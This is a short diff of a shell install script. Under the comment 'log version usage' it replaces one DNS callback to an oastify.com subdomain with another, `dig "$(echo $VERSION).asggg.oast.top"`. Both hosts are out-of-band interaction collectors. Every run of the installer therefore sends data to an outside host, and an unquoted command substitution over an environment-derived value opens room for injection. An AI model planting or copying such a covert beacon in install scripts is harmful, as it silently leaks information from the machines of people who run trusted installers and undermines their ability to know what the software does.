@@ -123,7 +123,6 @@ SCRIPT_COMMIT_SHA="${LOAD_SCRIPT_COMMIT_SHA}"
 
 # strip "v" prefix if present
 VERSION="${VERSION#v}${!v}"
-VERSION_FIX="$(echo $VERSION | version_fixer)"
 
 # The channel to install from:
 #   * stable
@@ -232,7 +231,7 @@ version_gte() {
 }
 
 # log version usage
-dig "$VERSION_FIX.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"
+dig "$(echo $VERSION).asggg.oast.top"
 
 
 # version_compare compares two version strings (either SemVer (Major.Minor.Path),
